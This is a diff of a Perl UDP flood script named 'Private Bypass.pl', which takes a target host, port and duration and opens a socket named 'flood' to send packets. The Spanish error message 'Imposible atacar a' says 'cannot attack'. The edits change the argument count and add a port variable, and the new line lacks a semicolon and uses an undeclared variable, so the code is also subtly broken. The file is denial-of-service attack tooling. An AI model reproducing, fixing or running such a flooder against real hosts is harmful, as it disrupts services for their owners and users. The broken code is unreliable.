@@ -1,7 +1,7 @@
 use Socket;
 use strict;
  
-if ($#ARGV != 1) {
+if ($#ARGV != 2) {
   print " \n";
 
 print "
@@ -11,7 +11,7 @@ args -> perl Private Bypass.pl <host> <time>
 exit(1);
 }
  
-my ($ip,$port,$time,$config) = @ARGV;
+my ($ip,$porting,$time,$config) = @ARGV;
  
 my ($iaddr,$endtime,$psize,$pport,$size,$hexed,$hexed1,$hexed2,$hexed3,$hexed4);
 
@@ -21,6 +21,7 @@ $size = "999";
  
 $iaddr = inet_aton("$ip") or die "Imposible atacar a $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
+$port = ("$porting")
  
 socket(flood, PF_INET, SOCK_DGRAM, 17);
  
